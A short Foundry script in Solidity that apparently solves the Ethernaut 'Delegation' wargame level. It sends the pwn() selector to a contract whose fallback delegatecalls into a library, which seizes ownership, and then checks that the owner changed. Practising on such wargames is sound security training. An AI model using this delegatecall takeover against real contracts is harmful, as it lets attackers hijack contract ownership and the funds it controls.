pragma solidity ^0.8.17;
import "forge-std/Script.sol";
import "../src/Delegation/Delegation.sol";

contract FallbackScript is Script {
    function run() public {
        address delegationAddress = vm.envAddress("DELEGATION_ADDRESS");
        Delegation ethernautDelegation = Delegation(payable(delegationAddress));

        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerKey);

        address originalOwner = ethernautDelegation.owner();

        bytes4 method = bytes4(keccak256("pwn()"));
        address(ethernautDelegation).call(abi.encode(method));
        require(originalOwner != ethernautDelegation.owner(), "owner did not change");

        vm.stopBroadcast();
        console.log("SUCCESS");
    }
}